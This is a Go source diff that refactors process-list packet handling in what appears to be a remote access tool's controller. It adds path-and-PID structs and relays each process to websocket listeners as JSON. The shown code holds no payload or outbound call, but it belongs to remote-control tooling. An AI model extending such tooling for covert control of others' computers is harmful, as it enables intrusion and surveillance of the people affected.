@@ -1,7 +1,6 @@
 package main
 
 import (
-	"fmt"
 	"rat/common"
 
 	"encoding/json"
@@ -9,44 +8,32 @@ import (
 	"golang.org/x/net/websocket"
 )
 
-type ProcessPacket struct {
-	Type int
-	PIDs []int
+type Process struct {
+	Path string `both`
+	PID  int    `both`
 }
 
-func (packet ProcessPacket) GetHeader() common.PacketHeader {
+type ProcessPacket struct {
+	Action    int       `both`
+	Processes []Process `both`
+}
+
+func (packet *ProcessPacket) Header() common.PacketHeader {
 	return common.ProcessHeader
 }
 
-func (packet ProcessPacket) Write(c *Client) error {
-	c.WriteInt(packet.Type)
+func (packet *ProcessPacket) Init(c *Client) {
 
-	c.WriteInt(len(packet.PIDs))
-
-	for _, pid := range packet.PIDs {
-		c.WriteInt(pid)
-	}
-
-	return nil
 }
 
-func (packet ProcessPacket) Read(c *Client) error {
-	len, _ := c.ReadInt()
-
-	for i := 0; i < len; i++ {
-		pid, err := c.ReadInt()
-		name, err := c.ReadString()
-
-		if err != nil {
-			fmt.Println("process:", err.Error())
-		}
-
+func (packet *ProcessPacket) OnReceive(c *Client) error {
+	for _, proc := range packet.Processes {
 		if ws, ok := c.Listeners[common.ProcessHeader]; ok {
-			message := ProcessMessage{pid, name}
+			message := ProcessMessage{proc.PID, proc.Path}
 			mstr, _ := json.Marshal(&message)
 			event := newEvent(ProcessQueryEvent, c.Id, string(mstr))
 
-			err = websocket.JSON.Send(ws, &event)
+			err := websocket.JSON.Send(ws, &event)
 
 			if err != nil {
 				return err
